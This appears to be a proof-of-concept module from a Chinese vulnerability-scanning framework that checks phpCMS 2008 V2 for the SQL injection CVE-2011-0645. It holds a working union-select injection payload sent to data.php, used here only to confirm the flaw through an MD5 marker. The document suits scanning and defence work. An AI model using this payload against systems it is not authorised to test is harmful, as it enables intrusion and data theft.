# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0017' # 平台漏洞编号，留空
    name = 'phpCMS 2008 V2 SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2011-01-17'  # 漏洞公布时间
    desc = '''
        phpCMS 2008 V2 - 'data.php' 文件SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/35239/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = 'CVE-2011-0645' #cve编号
    product = 'phpcms'  # 漏洞应用名称
    product_version = '2008 V2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e98aa360-398a-41c0-8f02-52a4815b641f'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            
            payload = ("/path/data.php?action=get&where_time=-1+union+all+select+1,MD5(3.14)--%20") 
            target_url=arg + payload
            code, head, res, _, _ = hh.http(target_url)
                       
            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()
    